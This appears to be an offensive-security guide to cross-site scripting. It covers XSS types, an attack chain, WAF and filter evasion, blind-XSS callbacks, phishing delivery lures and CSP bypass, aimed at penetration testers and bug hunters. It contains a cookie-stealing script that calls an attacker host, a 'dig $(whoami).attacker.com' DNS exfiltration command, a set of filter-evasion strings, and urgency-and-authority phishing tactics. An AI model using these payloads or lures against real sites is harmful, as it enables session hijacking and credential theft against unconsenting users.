**MITRE ATT&CK**: T1189-Drive-by Compromise

## Description

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into trusted websites. The victim's browser executes the attacker-injected JavaScript because it trusts the target domain, leading to serious consequences such as session hijacking, credential theft, keylogging, and phishing scams. XSS has consistently ranked in the OWASP Top 10 and is one of the most common and impactful vulnerability types in web security.

**Four Core Types**:

- **Reflected XSS**: Malicious payloads are submitted through URL parameters or forms, and the server embeds the input as-is into the response HTML. The attack requires tricking the victim into clicking a specially crafted link. Commonly found in search boxes, error messages, and redirect pages.
- **Stored XSS**: Malicious payloads are persisted on the server (database, logs, comments), and any user visiting that page will trigger script execution. This is the most impactful type with the widest reach. Commonly found in comment sections, user nicknames, filenames, and messaging systems.
- **DOM-based XSS**: The entire attack flow occurs on the client side without server involvement. JavaScript reads data from sources like `location.hash`, `document.URL`, and `document.referrer` and writes it directly to the DOM. Commonly found in single-page applications (SPAs), front-end routing, and dynamic rendering.
- **Mutation XSS (mXSS)**: Exploits differences in how the browser HTML parser and sanitization libraries parse the same string, bypassing XSS filters like DOMPurify. When sanitized HTML is re-serialized and parsed by the browser, it may produce dangerous tags or attributes that were originally filtered.

**Advanced Bypass Dimensions**: WAF rule bypass, encoding obfuscation (HTML Entity / URL / Unicode / Base64), event handler alternatives, SVG/MathML injection, template literal injection, prototype pollution chains, CSS injection combinations.

## Use Cases

1. **Web Application Penetration Testing**: Systematically probe all user input points (URL parameters, forms, HTTP headers, cookies), verify XSS vulnerabilities, and assess impact scope.
2. **Bug Bounty Hunting**: Quickly locate XSS-exploitable points on large attack surfaces, construct high-value PoCs to demonstrate actual harm of session hijacking or data theft.
3. **Security Code Audit**: Review DOM operations in front-end code (`innerHTML`, `document.write`, `eval`) and back-end template rendering logic, identify unvalidated/unencoded output points.
4. **Red Team Social Engineering Attack Chain**: Combine phishing emails or social media to distribute links containing XSS payloads, steal session tokens from target internal systems, or execute browser exploit chains.
5. **CSP Policy Audit and Bypass**: Detect Content Security Policy configuration flaws, exploit insecure directives (e.g., `unsafe-inline`, `unsafe-eval`, permissive `script-src` domains) to bypass protection.

## Methodology

### Attack Chain

```
[1] Input Point          [2] Payload Testing       [3] Filter Bypass
    Discovery               - Basic probing            - Encoding obfuscation
  - URL parameters          - Context analysis          - Tag/attribute alternatives
  - Form fields             - Response tracing          - WAF fingerprinting
  - HTTP headers            - Render verification       - Mutation exploitation
  - Cookie / LocalStorage        |                        |
       |                        v                        v
       v                   [4] Exploitation           [5] Post-Exploitation
                             - Cookie theft             - Session hijacking
                             - Keylogger injection      - Phishing page overlay
                             - Page defacement/phishing - Lateral movement (via browser)
                             - CSRF + XSS combination   - Data exfiltration
```

**Key Principle**: Every XSS test must confirm three elements -- (1) input is controllable, (2) output is unencoded, and (3) the browser executes it.

## Practical Steps

### 1. Reflected XSS
Inject scripts into URL parameters where the server embeds the input as-is into the response. First probe with `<script>` tags; if filtered, switch to event handlers (`onerror`, `onload`, `onfocus`). Analyze the context of the input within the response (between HTML tags, inside attribute values, inside JavaScript variables) and choose the corresponding escape strategy.

### 2. Stored XSS
Persist malicious payloads on the server (user nicknames, comments, filenames, HTTP headers) — all users accessing that data will trigger execution. Prioritize testing header fields echoed in admin panels (User-Agent, Referer) and user-visible fields (comments, nicknames).

### 3. DOM-based XSS
The entire attack occurs on the client side; the payload does not pass through the server. Focus on auditing dangerous sinks like `innerHTML`, `document.write`, and jQuery `.html()`, combined with sources like `location.hash`, `document.URL`, and `window.name` to construct exploitation chains.

### 4. WAF Bypass
Bypass WAF rules through encoding obfuscation (HTML Entity, URL, Unicode, Base64), mixed casing, double encoding, null byte injection, newline/tab interference, and SVG/MathML injection techniques. Use string concatenation (`window['al'+'ert']`) for keyword detection bypass.

### 5. Blind XSS
Inject payloads with external callbacks in locations where responses cannot be directly seen (admin management systems, log analysis platforms, internal tools), and use XSStrike blind mode or Dalfox with a callback server to verify execution.

### 6. Session Hijacking PoC
Construct post-exploitation payloads for cookie theft, keylogging, and page content exfiltration to demonstrate the actual impact of XSS vulnerabilities. Use the `new Image().src` technique to bypass CORS restrictions for data exfiltration.

## XSS Payload Delivery and Social Engineering

Even the most sophisticated XSS payload is useless without a delivery mechanism that reaches the victim's browser. This section covers the delivery vectors and social engineering techniques that make XSS attacks successful in real-world engagements.

**Delivery Vectors**:

| Vector | XSS Type | Typical Scenario |
|--------|----------|-----------------|
| Crafted URL (email/chat) | Reflected | Phishing email with link containing payload in query parameter |
| Malicious comment/post | Stored | Forum, blog, or social media post with embedded payload |
| Compromised third-party script | Supply Chain | Ad networks, analytics scripts, CDN-hosted libraries |
| Shortened URLs | Reflected | URL shorteners hide the payload from visual inspection |
| QR code | Reflected | Physical-world delivery: posters, business cards, printed materials |
| WiFi captive portal | Stored/DOM | Rogue access point injecting scripts into login page |
| Malicious browser extension | DOM | Extension content scripts interacting with target page |

**Social Engineering Amplifiers**: Reflected XSS requires victim interaction. The click-through rate depends on context credibility. The most effective lures combine urgency ("Your account will be suspended"), authority ("Internal IT portal update"), and familiarity (matching corporate branding). Shortened URLs and QR codes reduce visual suspicion.

**Key Principle**: During penetration testing, always demonstrate the full attack chain including the delivery mechanism, not just the payload. Stakeholders understand risk better when they see how an attacker would actually reach their users.

## Blind XSS and Callback Techniques

Blind XSS occurs when the injected payload executes in a context the attacker cannot directly observe -- typically in an admin panel, internal dashboard, log viewer, or support ticket system. The attacker injects a payload with an external callback mechanism and waits for the payload to fire when an authorized user views the affected page.

**Callback Mechanisms**:

| Mechanism | Command | Use Case |
|-----------|---------|----------|
| XSS Hunter | `xsshunter.com` integration | Automated blind XSS detection with screenshots |
| Interactsh | `interactsh-client` | Self-hosted OOB callback server |
| Burp Collaborator | Built into Burp Suite | Integrated with Burp testing workflow |
| Custom webhook | `https://webhook.site` | Quick ad-hoc callback testing |
| DNS exfiltration | `dig $(whoami).attacker.com` | When HTTP callbacks are blocked |

**High-Value Blind XSS Injection Points**:
- User-Agent, Referer, X-Forwarded-For headers (echoed in admin analytics)
- Support ticket fields (viewed by staff in internal systems)
- User profile fields (viewed by admins during moderation)
- File metadata (EXIF data, filenames in upload forms)
- API logs and error tracking systems (Sentry, Datadog)

**Payload Pattern**: `<script>fetch('https://callback.attacker.com/xss?c='+document.cookie+'&l='+location.href)</script>`

## XSS Filter Evasion

XSS filter evasion is the art of crafting payloads that bypass sanitization libraries, browser built-in XSS auditors, and custom input filters. Modern web applications deploy multiple layers of defense, but each layer introduces parser inconsistencies that attackers can exploit.

**Core Evasion Strategies**:

| Strategy | Technique | Example |
|----------|-----------|---------|
| Encoding obfuscation | HTML Entity, URL, Unicode, Base64 | `&#x61;lert(1)` |
| Case manipulation | Mixed-case tag/attribute names | `<ScRiPt>alert(1)</ScRiPt>` |
| Null byte injection | Break parser logic with `%00` | `<scr%00ipt>alert(1)</script>` |
| Whitespace tricks | Tab, newline, carriage return | `<img src=x onerror="al\tfert(1)">` |
| Tag alternatives | Lesser-known event handlers | `<details open ontoggle=alert(1)>` |
| SVG/MathML nesting | Abuse namespace parsing | `<svg><animate onbegin=alert(1)>` |

**Key Principle**: Every filter operates on a specific parser. When the filter's parser and the browser's parser disagree on how to interpret the same string, evasion is possible. The goal is to construct a string that the filter considers safe but the browser executes as code.

> **For detailed evasion payloads see `guides/xss-filter-evasion-guide.md` and `payloads.md`.**

## Content Security Policy Bypass

Content Security Policy (CSP) is a browser-enforced defense that restricts which scripts a page can execute. However, misconfigured CSP policies are common and can be systematically bypassed.

**Common CSP Weaknesses**:

| Misconfiguration | Bypass Technique |
|------------------|-----------------|
| `unsafe-inline` in `script-src` | Direct inline script injection |
| `unsafe-eval` in `script-src` | `eval()`, `Function()`, `setTimeout(string)` |
| Whitelisted CDN domains | Load malicious JS from allowed CDN or use JSONP endpoints |
| Missing `base-uri` restriction | `<base>` tag hijacking to redirect script loads |
| Missing `object-src` restriction | `<object>` / `<embed>` tag injection |
| Permissive `script-src` with Angular | Angular template injection via `ng-app` + `{{$eval.constructor('alert(1)')()}}` |
| `strict-dynamic` with pre-existing script | Leverage script gadgets in trusted JS to load attacker code |

**CSP Bypass Workflow**:
1. Extract CSP header: `curl -sI https://target.com | grep -i content-security-policy`
2. Analyze with Google CSP Evaluator or `csp-evaluator` tool
3. Identify allowed script sources and JSONP endpoints
4. Construct payload using the weakest allowed directive
